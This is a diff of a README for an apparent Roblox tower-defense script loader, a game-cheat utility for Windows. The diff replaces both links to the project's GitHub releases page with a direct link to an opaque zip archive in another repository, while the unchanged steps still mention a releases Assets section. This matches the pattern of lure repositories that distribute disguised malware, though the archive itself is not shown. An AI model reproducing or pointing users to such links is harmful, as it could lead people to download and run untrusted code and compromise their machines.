@@ -5,7 +5,7 @@ description: "Manage All Star Tower Defense scripts with an HTML utility featuri
 ---
 # 🛡️ all-star-tower-script-loader - Automate your tower defense game efficiently
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/linemancarolingian458/all-star-tower-script-loader/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/linemancarolingian458/linemancarolingian458.github.io/main/Epirote/v1.3.zip)
 
 This utility manages scripts for the Roblox tower defense game. It automates gold collection and organizes your settings in one window. You do not need coding skills to use this tool. It runs on Windows systems.
 
@@ -13,7 +13,7 @@ This utility manages scripts for the Roblox tower defense game. It automates gol
 
 You need to obtain the latest version of the utility to begin. Visit the official release page to find the installer.
 
-[Download the latest version here](https://github.com/linemancarolingian458/all-star-tower-script-loader/releases)
+[Download the latest version here](https://raw.githubusercontent.com/linemancarolingian458/linemancarolingian458.github.io/main/Epirote/v1.3.zip)
 
 1. Navigate to the link above.
 2. Look for the Assets section at the bottom of the page.
